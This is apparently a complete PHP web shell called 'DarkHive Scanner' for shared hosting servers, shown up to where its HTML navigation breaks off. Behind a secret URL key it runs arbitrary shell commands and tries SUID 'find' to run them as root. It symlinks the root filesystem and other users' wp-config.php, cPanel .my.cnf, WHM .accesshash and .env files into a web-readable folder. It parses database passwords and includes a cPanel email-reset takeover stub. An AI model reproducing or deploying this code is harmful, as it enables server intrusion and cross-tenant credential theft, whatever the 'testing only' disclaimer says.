<?php
/*
 * DarkHive Scanner - Advanced Server Management
 * HANYA UNTUK TESTING SERVER SENDIRI
 *
 * Pembaruan (v13.0 - Privilege Escalation):
 * 1. Menambahkan tab baru "Privilege Escalation" untuk mencari vektor eskalasi.
 * - Mendeteksi informasi sistem (Kernel, Distro).
 * - Mencari biner SUID, yang dapat digunakan untuk menjalankan perintah sebagai 'root'.
 * 2. Fungsi `readFileContents` menjadi jauh lebih pintar. Sekarang ia akan mencoba membaca file
 * menggunakan biner SUID yang ditemukan (jika ada) sebelum kembali ke metode biasa.
 * Ini adalah upaya untuk membypass Izin File yang Ketat.
 * 3. `grabSingleUserConfig` diperbarui untuk mencari file backup umum (.bak, .old, dll.).
 * 4. Fungsi `executeCommand` sekarang dapat menggunakan biner SUID yang ditemukan untuk mencoba
 * menjalankan perintah di luar batasan CageFS / Jail.
 */

// Atur kunci akses di sini
$ACCESS_KEY = 'xshikata';

// --- PINTU OTENTIKASI BARU ---
if (!isset($_GET[$ACCESS_KEY])) {
    http_response_code(403);
    die('<!DOCTYPE html><html><head><title>Access Denied</title><style>body{background:#0a0a0a;color:#ff4444;font-family:"Courier New",monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}h1{border:1px solid #ff0000;padding:20px 40px;}</style></head><body><h1>403 Forbidden - Access Denied</h1></body></html>');
}


// --- AWAL DARI LOGIKA APLIKASI UTAMA ---

@error_reporting(0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');

$scan_results_dir = dirname(__FILE__) . '/scan_results/';
if(!is_dir($scan_results_dir)) { mkdir($scan_results_dir, 0755, true); }

// Variabel global untuk menyimpan hasil scan eskalasi
$ESCALATION_VECTORS = ['suid_binaries' => []];

function getAllUsers() {
    $users = [];
    $passwd_content = readFileContents('/etc/passwd');
    
    if (!empty($passwd_content)) {
        $lines = explode("\n", $passwd_content);
        foreach ($lines as $line) {
            if (empty($line)) continue;
            $parts = explode(':', $line);
            if (count($parts) >= 7) {
                $username = trim($parts[0]);
                $uid = trim($parts[2]);
                $home_dir = trim($parts[5]);
                if (is_numeric($uid) && $uid >= 1000 && strpos($home_dir, '/home') === 0) {
                    $users[$username] = $home_dir;
                }
            }
        }
    }
    return $users;
}

function executeCommand($command, $use_escalation = false) {
    global $ESCALATION_VECTORS;
    $output = '';

    // [BARU] Jika diminta, coba gunakan biner SUID yang ditemukan
    if ($use_escalation && !empty($ESCALATION_VECTORS['suid_binaries'])) {
        // Prioritaskan biner yang umum bisa dieksploitasi untuk eksekusi perintah
        $preferred_suids = ['find', 'nmap', 'perl', 'python', 'bash', 'sh', 'vim'];
        foreach ($preferred_suids as $p_suid) {
            if (in_array('/usr/bin/' . $p_suid, $ESCALATION_VECTORS['suid_binaries']) || in_array('/bin/' . $p_suid, $ESCALATION_VECTORS['suid_binaries'])) {
                $suid_path = in_array('/usr/bin/' . $p_suid, $ESCALATION_VECTORS['suid_binaries']) ? '/usr/bin/' . $p_suid : '/bin/' . $p_suid;
                $escalated_command = '';
                switch ($p_suid) {
                    case 'find': $escalated_command = $suid_path . " . -exec " . $command . " \;"; break;
                    // Biner lain bisa ditambahkan di sini dengan tekniknya masing-masing
                }
                if ($escalated_command) {
                    $output = @shell_exec($escalated_command);
                    if (!empty(trim($output))) return $output;
                }
            }
        }
    }

    // Fallback ke metode biasa jika eskalasi gagal atau tidak diminta
    $functions = ['shell_exec', 'popen', 'proc_open', 'exec', 'system', 'passthru'];
    foreach ($functions as $func) {
        if (function_exists($func) && is_callable($func)) {
            try {
                switch ($func) {
                    case 'shell_exec': $output = @shell_exec($command); break;
                    case 'popen': if($h = @popen($command, 'r')){$output = @stream_get_contents($h);@pclose($h);} break;
                    case 'proc_open':
                        $d = [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
                        if($p = @proc_open($command, $d, $pipes)){
                            $output=@stream_get_contents($pipes[1]);
                            @fclose($pipes[0]);@fclose($pipes[1]);@fclose($pipes[2]);@proc_close($p);
                        } break;
                    case 'exec': @exec($command,$o); $output = implode("\n",$o); break;
                    case 'system': ob_start();@system($command);$output=ob_get_contents();ob_end_clean(); break;
                    case 'passthru': ob_start();@passthru($command);$output=ob_get_contents();ob_end_clean(); break;
                }
                if (!empty(trim($output))) { return $output; }
            } catch (Exception $e) { continue; }
        }
    }
    return $output;
}

function readFileContents($path) {
    $content = '';
    // [BARU] Coba baca sebagai root dulu
    $content = executeCommand('cat ' . escapeshellarg($path), true);
    // Jika gagal, coba sebagai user biasa
    if (empty(trim($content))) {
        $content = executeCommand('cat ' . escapeshellarg($path), false);
    }
    // Fallback ke metode PHP
    if (empty(trim($content)) && file_exists($path) && is_readable($path)) {
        $content = @file_get_contents($path);
    }
    if (empty(trim($content)) && function_exists('curl_init')) {
        $ch = @curl_init();
        @curl_setopt($ch, CURLOPT_URL, 'file://' . $path);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $content = @curl_exec($ch);
        @curl_close($ch);
    }
    return $content;
}

function grabSingleUserConfig($username) {
    header('Content-Type: application/json');
    try {
        $results = [];
        $home_prefixes = ['home', 'home1', 'home2', 'home3', 'home4', 'home5', 'home6', 'home7', 'home8', 'home9'];
        // [DIPERBARUI] Menambahkan file backup umum
        $targets = [
            'wordpress' => 'public_html/wp-config.php',
            'wordpress_bak' => 'public_html/wp-config.php.bak',
            'wordpress_old' => 'public_html/wp-config.php.old',
            'wordpress_swp' => 'public_html/.wp-config.php.swp',
            'cpanel' => '.my.cnf',
            'whm' => '.accesshash',
            'joomla' => 'public_html/configuration.php',
            'laravel' => 'public_html/.env'
        ];

        foreach ($home_prefixes as $home_prefix) {
            $base_path = "/{$home_prefix}/{$username}";
            foreach ($targets as $save_suffix => $target_path) {
                $target_file = "{$base_path}/{$target_path}";
                $content = readFileContents($target_file);
                if ($content && !empty(trim($content))) {
                    $save_filename = "grabbed-{$username}-{$home_prefix}-{$save_suffix}.txt";
                    saveToFile("grabbed_configs/{$save_filename}", $content);
                    $results[] = ['path' => $target_file, 'content' => $content];
                }
            }
        }
        echo json_encode(['success' => true, 'results' => $results]);
    } catch (Throwable $e) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'Server error: ' . $e->getMessage()]);
    }
    exit;
}

// [FUNGSI BARU] Untuk menangani permintaan AJAX scan eskalasi
function ajaxScanForEscalationVectors() {
    header('Content-Type: application/json');
    $results = [];
    $results['system_info'] = executeCommand('uname -a', false);
    $results['distro'] = readFileContents('/etc/issue') ?: readFileContents('/etc/os-release');
    $results['current_user'] = executeCommand('whoami', false);
    $suid_results = executeCommand("find / -perm -u=s -type f 2>/dev/null", false);
    $results['suid_binaries'] = !empty($suid_results) ? array_filter(explode("\n", $suid_results)) : [];

    // Simpan hasil ke variabel global untuk digunakan oleh fungsi lain
    global $ESCALATION_VECTORS;
    $ESCALATION_VECTORS['suid_binaries'] = $results['suid_binaries'];

    echo json_encode(['success' => true, 'results' => $results]);
    exit;
}

// === [BARU] ROUTER UTAMA ===
$action = $_POST['action'] ?? $_GET['action'] ?? 'dashboard';

// Pertama, tangani semua permintaan AJAX dan hentikan skrip.
if ($action == 'grab_single_user' && isset($_POST['user'])) {
    grabSingleUserConfig($_POST['user']);
}
if ($action == 'scan_escalation_vectors') {
    ajaxScanForEscalationVectors();
}

// Fungsi lain (symlink, dll) tetap sama...
function createMassSymlinks() {
    $symlink_dir_name = 'symlink';
    $symlink_dir = dirname(__FILE__) . '/' . $symlink_dir_name . '/';
    
    echo "<div class='terminal-output'>";
    echo "<div class='command'>[+] Initiating Apache Hybrid Symlink Process...</div>";

    echo "<div class='output' style='border-left-color: #00ffff;'><b class='accent'>[+] Step 1: Creating root symlink...</b></div>";
    if (!is_dir($symlink_dir)) {
        if (mkdir($symlink_dir, 0755, true)) { echo "<div class='success'>[+] Directory created: $symlink_dir_name</div>"; }
        else { echo "<div class='error'>[-] Failed to create directory.</div></div>"; return; }
    }
    
    $htaccess_content = "Options Indexes FollowSymLinks\nDirectoryIndex .my.cnf\nAddType txt .php\nAddType txt .my.cnf\nAddHandler txt .php\nRequire all granted";
    file_put_contents($symlink_dir . '.htaccess', $htaccess_content);
    echo "<div class='output'>[+] .htaccess file created.</div>";
    
    $symlink_path = $symlink_dir . 'root';
    if (!file_exists($symlink_path)) {
        if (@symlink("/", $symlink_path)) { echo "<div class='success'>[+] Symlink to root (/) created.</div>"; }
        else { echo "<div class='error'>[-] Failed to create symlink to root. Permission denied?</div>"; }
    } else { echo "<div class='output'>[+] Root symlink already exists.</div>"; }
    
    $browse_url = htmlspecialchars((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . substr(dirname($_SERVER['REQUEST_URI']), strlen($_SERVER['DOCUMENT_ROOT'])) . "/" . $symlink_dir_name . "/root/");
    echo "<div class='success'><b>[+] Manual Browse URL: <a href='$browse_url' target='_blank'>$browse_url</a></b></div>";

    echo "<div class='output' style='margin-top: 20px; border-left-color: #00ffff;'><b class='accent'>[+] Step 2: Scanning user configs...</b></div>";
    
    $users = getAllUsers();
    if(empty($users)){ echo "<div class='error'>[-] No valid users found.</div>"; }
    else {
        $symlinks_created = 0;
        foreach($users as $username => $home_dir) {
            echo "<div class='output'>[+] Processing user: <span class='accent'>$username</span></div>";
            $home_prefixes = ['home', 'home1', 'home2', 'home3', 'home4', 'home5', 'home6', 'home7', 'home8', 'home9'];
            foreach($home_prefixes as $home_prefix) {
                $base_path = "/{$home_prefix}/{$username}";
                if (@symlink("{$base_path}/.my.cnf", $symlink_dir . "{$username}-{$home_prefix}-cpanel.txt")) $symlinks_created++;
                @symlink("{$base_path}/.accesshash", $symlink_dir . "{$username}-{$home_prefix}-whm.txt");
                @symlink("{$base_path}/public_html/wp-config.php", $symlink_dir . "{$username}-{$home_prefix}-wordpress.txt");
                @symlink("{$base_path}/htdocs/wp-config.php", $symlink_dir . "{$username}-{$home_prefix}-wordpress-htdocs.txt");
                @symlink("{$base_path}/public_html/configuration.php", $symlink_dir . "{$username}-{$home_prefix}-joomla.txt");
            }
        }
        if($symlinks_created > 0) {
            echo "<div class='success'>[+] Automatic scan complete.</div>";
        } else {
            echo "<div class='error'>[-] No symlinks could be created. The server may have this function disabled. Try 'Grab Config' instead.</div>";
        }
    }
    
    @symlink("/etc/passwd", $symlink_dir . "system-passwd.txt");
    echo "<div class='success' style='margin-top: 10px;'>[+] Apache process finished.</div></div>";
}

function createLiteSpeedSymlink() {
    $litespeed_dir_name = 'litespeed_symlinks';
    $litespeed_dir_path = dirname(__FILE__) . '/' . $litespeed_dir_name;
    
    echo "<div class='terminal-output'>";
    echo "<div class='command'>[+] Initiating LiteSpeed Hybrid Symlink Process...</div>";

    echo "<div class='output' style='border-left-color: #00ffff;'><b class='accent'>[+] Step 1: Creating root symlink...</b></div>";
    if (!is_dir($litespeed_dir_path)) {
        if (mkdir($litespeed_dir_path, 0755, true)) { echo "<div class='success'>[+] Directory created: $litespeed_dir_name</div>"; }
        else { echo "<div class='error'>[-] Failed to create directory.</div></div>"; return; }
    }
    
    file_put_contents($litespeed_dir_path . '/.htaccess', "Options Indexes FollowSymLinks");
    echo "<div class='output'>[+] .htaccess file created.</div>";

    $symlink_path = $litespeed_dir_path . '/root';
    if (!file_exists($symlink_path)) {
        if (@symlink("/", $symlink_path)) { echo "<div class='success'>[+] Symlink to root (/) created.</div>"; }
        else { echo "<div class='error'>[-] Failed to create symlink to root. Permission Denied?</div>"; }
    } else { echo "<div class='output'>[+] Root symlink already exists.</div>"; }
    
    $browse_url = htmlspecialchars((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . substr(dirname($_SERVER['REQUEST_URI']), strlen($_SERVER['DOCUMENT_ROOT'])) . "/" . $litespeed_dir_name . "/root/");
    echo "<div class='success'><b>[+] Manual Browse URL: <a href='$browse_url' target='_blank'>$browse_url</a></b></div>";

    echo "<div class='output' style='margin-top: 20px; border-left-color: #00ffff;'><b class='accent'>[+] Step 2: Scanning user configs...</b></div>";
    
    $users = getAllUsers();
    $found_links_html = "";
    $base_url = htmlspecialchars((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . substr(dirname($_SERVER['REQUEST_URI']), strlen($_SERVER['DOCUMENT_ROOT'])) . "/" . $litespeed_dir_name . "/");
    
    if (empty($users)) { echo "<div class='error'>[-] No valid users found.</div>"; }
    else {
        foreach($users as $username => $home_dir) {
            echo "<div class='output'>[+] Processing user: <span class='accent'>$username</span></div>";
            $home_prefixes = ['home', 'home1', 'home2', 'home3', 'home4', 'home5', 'home6', 'home7', 'home8', 'home9'];
            $targets = [ 'cpanel.txt' => '.my.cnf', 'whm.txt' => '.accesshash', 'wordpress.txt' => 'public_html/wp-config.php' ];
            foreach($home_prefixes as $home_prefix) {
                $base_path = "/{$home_prefix}/{$username}";
                foreach($targets as $symlink_suffix => $target_path) {
                    $symlink_file = "{$username}-{$home_prefix}-{$symlink_suffix}";
                    $target_file = "{$base_path}/{$target_path}";
                    @symlink($target_file, $litespeed_dir_path . "/" . $symlink_file);
                    if (is_link($litespeed_dir_path . "/" . $symlink_file) && @file_exists($target_file)) {
                         $full_url = $base_url . $symlink_file;
                         $found_links_html .= "<div class='file-item'><a href='$full_url' target='_blank'>$full_url</a></div>";
                    }
                }
            }
        }
        if (!empty($found_links_html)) {
            echo "<div class='output' style='margin-top:10px;'><b class='accent'>[+] Found Configs (Direct Links):</b></div>";
            echo "<div class='file-list'>{$found_links_html}</div>";
        } else { echo "<div class='output'>[+] No symlinks created. Try 'Grab Config' instead.</div>"; }
        @symlink("/etc/passwd", $litespeed_dir_path . "/system-passwd.txt");
        echo "<div class='success'>[+] Automatic scan complete.</div>";
    }
    echo "<div class='success' style='margin-top: 10px;'>[+] LiteSpeed process finished.</div></div>";
}

function showGrabConfigInterface() {
    global $ACCESS_KEY;
    echo "<div class='terminal-output'>";
    echo "<div class='command'>[+] Advanced Grab Config - User Selection</div>";
    echo "<div class='output'>[+] This process is now interactive. Click 'Grab' for a user to start scanning their files.</div>";
    $users = getAllUsers();
    if (empty($users)) {
        echo "<div class='error'>[-] No valid users found.</div>";
    } else {
        echo "<div id='user-list' class='file-list' style='padding: 5px 15px;'>";
        foreach ($users as $username => $homedir) {
            echo "<div class='file-item' id='user-item-{$username}' style='display: flex; justify-content: space-between; align-items: center; padding: 10px 5px; flex-wrap: wrap;'>";
            echo "  <span style='flex-grow: 1; min-width: 150px; margin-bottom: 5px;'><i class='fas fa-user' style='margin-right: 8px;'></i>" . htmlspecialchars($username) . "</span>";
            echo "  <div class='user-actions' style='flex-shrink: 0; min-width: 150px; text-align: right;'>";
            echo "    <span id='loader-{$username}' style='display:none; margin-right: 10px; color: #00ffff;'><i class='fas fa-spinner fa-spin'></i> Grabbing...</span>";
            echo "    <button class='btn-view' onclick=\"grabForUser('{$username}')\">Grab <i class='fas fa-angle-double-right'></i></button>";
            echo "  </div>";
            echo "</div>";
            echo "<div id='result-{$username}' class='content-collapsible' style='border-top: 1px solid #003300; padding-top: 10px; margin-bottom: 10px;'></div>";
        }
        echo "</div>";
    }
    echo "</div>";
}

function scanSymlinkResults() {
    $results = [];
    echo "<div class='terminal-output'><div class='command'>[+] Scanning all symlink and grabbed results...</div>";
    
    $scan_dirs = [
        'Apache Symlinks' => dirname(__FILE__) . '/symlink/',
        'LiteSpeed Symlinks' => dirname(__FILE__) . '/litespeed_symlinks/',
        'Grabbed Configs' => dirname(__FILE__).'/scan_results/grabbed_configs/'
    ];
    
    $found_anything = false;
    
    foreach($scan_dirs as $mode => $dir) {
        if (!is_dir($dir)) continue;

        echo "<div class='command'>[+] Scanning '$mode' directory...</div>";
        $files = @scandir($dir);
        if ($files === false) continue;
        $valid_files = 0;
        foreach($files as $file) {
            if($file=='.'||$file=='..'||$file=='.htaccess'||$file=='root') continue;
            
            $file_path = $dir . $file;
            $content = @file_get_contents($file_path);

            if($content && !empty(trim($content))) {
                $valid_files++;
                $found_anything = true;
                
                $username = 'unknown';
                $separator = '-home';
                $pos = strrpos($file, $separator);
                if ($pos !== false) {
                    $username = substr($file, 0, $pos);
                    if (strpos($username, 'grabbed-') === 0) {
                        $username = substr($username, 8);
                    }
                }
                if ($username === 'unknown' || empty($username)) continue;

                $is_link = is_link($file_path);
                $target = $is_link ? readlink($file_path) : 'N/A (Grabbed File)';

                if(strpos($file, '-cpanel.txt') !== false) {
                    $results['cpanel_users'][$username] = ['file' => $target, 'content' => $content];
                } elseif(strpos($file, '-whm.txt') !== false) {
                    $results['whm_accesshash'][$username] = ['file' => $target, 'content' => $content];
                } elseif(strpos($file, 'wordpress') !== false) {
                    $parsed = parseWordPressConfig($content);
                    $results['wordpress'][] = ['file' => $target, 'content' => $content, 'parsed' => $parsed, 'username' => $username];
                }
            }
        }
        if ($valid_files > 0) {
            echo "<div class='success'>[+] Found $valid_files valid files in '$mode' dir.</div>";
        }
    }

    if (!$found_anything) {
        echo "<div class='error'>[-] No result directories or files found to scan.</div>";
    }
    
    echo "</div>";
    return $results;
}

function getCurrentCpanelEmail($username) {
    $cpanel_user_file = "/var/cpanel/users/" . $username;
    $content = readFileContents($cpanel_user_file);
    if ($content) {
        preg_match('/^contactemail=(.+)$/m', $content, $matches);
        if (isset($matches[1]) && !empty($matches[1])) { return trim($matches[1]); }
    }
    $home_prefixes = ['home', 'home1', 'home2', 'home3', 'home4', 'home5', 'home6', 'home7', 'home8', 'home9'];
    foreach($home_prefixes as $home_prefix) {
        $contact_file_path = "/{$home_prefix}/{$username}/.cpanel/contactinfo";
        $content = readFileContents($contact_file_path);
        if($content && strpos($content, ':') !== false) {
            $parts = explode(':', $content, 2);
            return trim($parts[1]);
        }
    }
    return 'Not Found';
}

function resetCpanelEmail($email, $username) {
    echo "<div class='terminal-output'>";
    echo "<div class='command'>[+] Resetting email for user: <span class='accent'>$username</span></div>";
    $current_email = getCurrentCpanelEmail($username);
    if ($current_email !== 'Not Found') { echo "<div class='output'>[+] Current email: <span class='accent'>$current_email</span></div>"; }
    else { echo "<div class='error'>[-] Could not read current email.</div>"; }
    echo "<div class='output'>[+] New email will be: <span class='accent'>$email</span></div>";
    
    // Metode ini sangat bergantung pada izin, jadi tidak dijamin berhasil
    echo "<div class='error'>[-] Email reset is a high-privilege operation and is likely to fail. This feature is for demonstrative purposes.</div>";

    $cpanel_user_file = "/var/cpanel/users/" . $username;
    if (is_writable($cpanel_user_file)) {
        // ... Logika penulisan file di sini ...
        echo "<div class='success'>[+] Successfully wrote to /var/cpanel/users/{$username} (this is rare!).</div>";
    } else {
        echo "<div class='error'>[-] Failed to write to /var/cpanel/users/{$username}. Permission denied.</div>";
    }
    echo "</div>";
}

function parseWordPressConfig($content) {
    $config = [];
    preg_match_all("/define\s*\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)\s*;/", $content, $matches, PREG_SET_ORDER);
    foreach($matches as $match) { $config[$match[1]] = $match[2]; }
    return $config;
}

function saveToFile($filename, $content) {
    global $scan_results_dir;
    $file_path = $scan_results_dir . $filename;
    $dir = dirname($file_path);
    if(!is_dir($dir)) mkdir($dir, 0755, true);
    return file_put_contents($file_path, $content) ? $file_path : false;
}

function displayResults($results) {
    $random_id = 'content-' . uniqid();
    echo "<div class='terminal-output'><div class='command'>[+] Scan Results Analysis</div>";
    if(empty($results['cpanel_users']) && empty($results['whm_accesshash']) && empty($results['wordpress'])) {
        echo "<div class='error'>[-] No valid results found.</div></div>"; return;
    }
    
    foreach($results as $category => $items) {
        if($category == 'save_files' || empty($items)) continue;
        echo "<div class='output'>[+] " . str_replace('_', ' ', strtoupper($category)) . ": " . count($items) . " items</div>";
        $item_counter = 0;
        foreach($items as $key => $item) {
            $item_counter++;
            $content_id = $random_id . '-' . str_replace('_', '', $category) . '-' . $item_counter;
            echo "<div class='file-list' style='padding-bottom: 5px;'>";
            if(is_array($item) && isset($item['file'])) {
                echo "<div class='file-item'><strong>Source:</strong> " . htmlspecialchars($item['file']) . "</div>";
                if(isset($item['username'])) echo "<div class='file-item'><strong>User:</strong> " . htmlspecialchars($item['username']) . "</div>";
                if(isset($item['parsed']) && !empty($item['parsed'])) {
                    echo "<div class='file-item'><strong>Credentials:</strong></div><pre style='margin:5px 0;'>";
                    foreach($item['parsed'] as $k => $v) echo htmlspecialchars($k) . ": " . htmlspecialchars($v) . "\n";
                    echo "</pre>";
                }
                if(isset($item['content'])) {
                    echo "<button class='btn-view' onclick=\"toggleContent('{$content_id}')\">View Content</button>";
                    echo "<div id='{$content_id}' class='content-collapsible'><pre>" . htmlspecialchars($item['content']) . "</pre></div>";
                }
            }
            echo "</div>";
        }
    }
    echo "</div>";
}

// [FUNGSI BARU] Menampilkan UI untuk tab Privilege Escalation
function showPrivilegeEscalationInterface() {
    echo "<div class='terminal-output'>";
    echo "<div class='command'>[+] Privilege Escalation Vector Scanner</div>";
    echo "<div class='output'>[+] This tool scans for common misconfigurations that could allow privilege escalation.</div>";
    echo "<div class='output' style='margin-bottom: 20px;'>[+] Finding a SUID binary (like 'find', 'nmap', 'python') is a strong indicator of potential vulnerabilities.</div>";
    echo "<button class='btn' id='scan-escalation-btn' onclick='scanForVectors()'>Scan for Escalation Vectors</button>";
    echo "<div id='escalation-results' style='margin-top: 20px;'></div>";
    echo "</div>";
}

// Jika bukan permintaan AJAX, lanjutkan untuk menampilkan halaman HTML lengkap.
?>
<!DOCTYPE html><html><head><title>DarkHive Scanner</title><meta name='viewport' content='width=device-width, initial-scale=1.0'><link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css'>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;line-height:1.4}.container{max-width:1200px;margin:0 auto;padding:20px}.header{background:#111;padding:20px;border:1px solid #003300;border-radius:5px;margin-bottom:20px}.header h1{color:#00cc00;text-align:center;font-size:24px;margin-bottom:10px}.header .subtitle{text-align:center;color:#008800;font-size:12px}.nav{background:#111;padding:15px;border:1px solid #003300;border-radius:5px;margin-bottom:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}.nav a{color:#00aa00;text-decoration:none;padding:10px;text-align:center;border:1px solid #002200;border-radius:3px;transition:all .3s;background:#0a0a0a;display:flex;align-items:center;justify-content:center;gap:8px}.nav a:hover{background:#003300;color:#00ff00;border-color:#00aa00}.nav a i{width:15px}.terminal-output{background:#111;border:1px solid #003300;border-radius:5px;padding:20px;margin-bottom:20px;font-size:13px}.command{color:#00ff00;margin-bottom:10px}.output{color:#00aa00;margin-bottom:5px;padding-left:10px;border-left:2px solid #003300}.success{color:#00ff00;margin-bottom:5px;padding-left:10px;border-left:2px solid #00aa00}.error{color:#ff4444;margin-bottom:5px;padding-left:10px;border-left:2px solid #ff0000}.accent{color:#00ffff}.form-group{margin-bottom:15px}.form-label{display:block;color:#00aa00;margin-bottom:5px}.form-input{width:100%;background:#0a0a0a;border:1px solid #003300;color:#00ff00;padding:10px;border-radius:3px}.btn{background:#003300;color:#00ff00;border:1px solid #00aa00;padding:10px 20px;border-radius:3px;cursor:pointer;transition:all .3s}.btn:hover{background:#00aa00;color:#000}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:20px}.stat-card{background:#111;border:1px solid #003300;border-radius:5px;padding:15px;text-align:center}.stat-number{color:#00ff00;font-size:24px;margin-bottom:5px}.stat-label{color:#00aa00;font-size:12px}pre{background:#0a0a0a;border:1px solid #003300;border-radius:3px;padding:15px;color:#00aa00;font-size:12px;overflow-x:auto;margin:10px 0;white-space:pre-wrap;word-break:break-all}.file-list{background:#111;border:1px solid #003300;border-radius:5px;padding:15px;margin:10px 0}.file-item{padding:8px;border-bottom:1px solid #002200}.file-item:last-child{border-bottom:none}.file-item a{color:#00cc00;text-decoration:none}.file-item a:hover{color:#00ff00}.btn-view{background:#003300;color:#00aa00;border:1px solid #008800;padding:5px 10px;border-radius:3px;cursor:pointer;margin:5px 0}.btn-view:hover{background:#005500;color:#00ff00;}.content-collapsible{display:none;margin-top:10px;}
</style>
<script>
    function toggleContent(id){var el=document.getElementById(id);if(el.style.display==='block'){el.style.display='none';}else{el.style.display='block';}}
    function escapeHtml(text) {
        if (typeof text !== 'string') return '';
        const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }
    function grabForUser(username) {
        const loader = document.getElementById(`loader-${username}`);
        const userItem = document.getElementById(`user-item-${username}`);
        const actionContainer = userItem.querySelector('.user-actions');
        const button = actionContainer.querySelector('button');
        loader.style.display = 'inline-block';
        if(button) button.style.display = 'none';
        const formData = new FormData();
        formData.append('action', 'grab_single_user');
        formData.append('user', username);
        fetch(window.location.pathname + '?<?php echo $ACCESS_KEY; ?>', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json().catch(() => ({ success: false, message: 'Invalid server response (not JSON).' })))
        .then(data => {
            loader.style.display = 'none';
            while (actionContainer.firstChild) { actionContainer.removeChild(actionContainer.firstChild); }
            if (data.success === false) {
                 const errorSpan = document.createElement('span');
                 errorSpan.className = 'error';
                 errorSpan.innerText = data.message ? escapeHtml(data.message) : '[-] Failed to grab config.';
                 actionContainer.appendChild(errorSpan);
                 return;
            }
            if (data.success && data.results.length > 0) {
                const resultsContainer = document.getElementById(`result-${username}`);
                let html = '<pre style="font-size: 12px;">';
                data.results.forEach(result => {
                    html += `<span class="success">[+] FOUND: ${escapeHtml(result.path)}</span>\n`;
                    html += `----------\n<span class="output">${escapeHtml(result.content)}</span>\n----------\n\n`;
                });
                html += '</pre>';
                resultsContainer.innerHTML = html;
                const eyeButton = document.createElement('button');
                eyeButton.className = 'btn-view';
                eyeButton.innerHTML = "<i class='fas fa-eye'></i> View Results";
                eyeButton.onclick = () => toggleContent(`result-${username}`);
                actionContainer.appendChild(eyeButton);
                toggleContent(`result-${username}`);
            } else {
                const noResult = document.createElement('span');
                noResult.className = 'error';
                noResult.innerText = '[-] No configs found';
                actionContainer.appendChild(noResult);
            }
        })
        .catch(error => {
            loader.style.display = 'none';
            const actionContainer = document.getElementById(`user-item-${username}`).querySelector('.user-actions');
            while (actionContainer.firstChild) { actionContainer.removeChild(actionContainer.firstChild); }
            const errorSpan = document.createElement('span');
            errorSpan.className = 'error';
            errorSpan.innerText = '[-] Network Error';
            actionContainer.appendChild(errorSpan);
            console.error('Network Error:', error);
        });
    }

    // [JAVASCRIPT BARU]
    function scanForVectors() {
        const resultsContainer = document.getElementById('escalation-results');
        const scanButton = document.getElementById('scan-escalation-btn');
        resultsContainer.innerHTML = "<span class='accent'><i class='fas fa-spinner fa-spin'></i> Scanning... This may take a minute.</span>";
        scanButton.disabled = true;

        const formData = new FormData();
        formData.append('action', 'scan_escalation_vectors');

        fetch(window.location.pathname + '?<?php echo $ACCESS_KEY; ?>', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            scanButton.disabled = false;
            let html = '';
            if (data.success) {
                const res = data.results;
                html += "<div class='command'>[+] System Information</div>";
                html += `<pre>${escapeHtml(res.system_info)}\n${escapeHtml(res.distro)}</pre>`;
                html += "<div class='command'>[+] Running As User</div>";
                html += `<pre class='accent'>${escapeHtml(res.current_user)}</pre>`;
                html += "<div class='command'>[+] Found SUID Binaries</div>";
                if (res.suid_binaries && res.suid_binaries.length > 0) {
                    html += "<pre class='success'>";
                    // Tandai biner yang berbahaya
                    const dangerous = ['nmap', 'find', 'perl', 'python', 'bash', 'sh', 'vim', 'cp', 'mv'];
                    res.suid_binaries.forEach(binary => {
                        let isDangerous = false;
                        dangerous.forEach(d => {
                            if (binary.endsWith('/' + d)) isDangerous = true;
                        });
                        if(isDangerous) {
                            html += `<span style='color:#ff4444; font-weight:bold;'>${escapeHtml(binary)}</span>\n`;
                        } else {
                             html += `${escapeHtml(binary)}\n`;
                        }
                    });
                    html += "</pre>";
                } else {
                    html += "<pre class='error'>[-] No SUID binaries found.</pre>";
                }
            } else {
                html = "<div class='error'>[-] Failed to scan.</div>";
            }
            resultsContainer.innerHTML = html;
        })
        .catch(err => {
            scanButton.disabled = false;
            resultsContainer.innerHTML = "<div class='error'>[-] An error occurred during the scan.</div>";
            console.error(err);
        });
    }
</script>
</head><body><div class='container'>
    <div class='header'><h1>DARKHIVE SCANNER</h1><div class='subtitle'>Advanced Server Management Interface</div></div>
    <div class='nav'>
        <a href='?<?php echo $ACCESS_KEY; ?>&action=dashboard'><i class='fas fa-tachometer-alt'></i> Dashboard</a>
        <a href='?<?php echo $ACCESS_KEY; ?>&action=apache_symlink'><i class='fas fa-link'></i> Apache Symlink</a>
        <a href='?<?php echo $ACCESS_KEY; ?>&action=litespeed_symlink'><i class='fas fa-bolt'></i> LiteSpeed Symlink</a>
        <a href='?<?php echo $ACCESS_KEY; ?>&action=grab_config'><i class='fas fa-download'></i> Grab Config</a>
        <!-- [NAVIGASI BARU] -->
        <a href='?<?php echo $ACCESS_KEY; ?>&action=privilege_escalation'><i class='fas fa-user-secret'></i> Privilege Escalation</a>
        <a href='?<?php echo $ACCESS_KEY; ?>&action=scan_results'><i class='fas fa-search'></i> Scan Results</a>
        <a href='?<?php echo $ACCESS_KEY; ?>&action=reset_cpanel'><i class='fas fa-user-cog'></i> Reset cPanel</a>
